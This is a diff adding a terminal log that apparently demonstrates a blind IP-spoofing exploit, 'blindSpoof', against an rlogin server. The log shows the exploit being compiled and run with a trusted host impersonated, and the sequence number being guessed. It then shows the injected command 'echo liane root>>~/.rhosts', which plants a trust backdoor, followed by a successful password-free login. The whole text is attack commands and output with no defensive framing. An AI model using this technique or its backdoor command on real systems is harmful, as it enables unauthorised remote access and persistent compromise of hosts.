@@ -1,0 +1,29 @@
+[root@liane /root]# rlogin -l stealth lucifer
+Password:
+Password:
+^D
+
+Login incorrect
+rlogin: connection closed.
+[root@liane /root]# !c+
+c++ blindSpoof.cc  -lusi++ -lpcap
+[root@liane /root]# ./a.out lucifer liane alice
+blindSpoof-exploit by S. Krahmer
+http://www.cs.uni-potsdam.de/homepages/students/linxuer
+
+Using sourceport 996
+liane.c-skills.de:996 -> lucifer.c-skills.de:513 [flags: SYN ] [ACK: 1709299065] [SEQ: 642221920]
+alice:996 -> lucifer.c-skills.de:513 [flags: SYN ] [ACK: 1709299065] [SEQ: 642221920]
+lucifer.c-skills.de:513 -> liane.c-skills.de:996 [flags: SYN ACK ] [ACK: 642221921] [SEQ: 3072739429]
+Low end: 3072739429
+3072742428
+Sending local username: stealth
+Sending remote username: stealth
+Sending terminal-type and speed.
+Sending command: echo liane root>>~/.rhosts
+
+
+[root@liane /root]# rlogin -l stealth lucifer
+Last login: Sat Sep 25 16:17:50 from alice
+You have mail.
+lucifer:[stealth]>
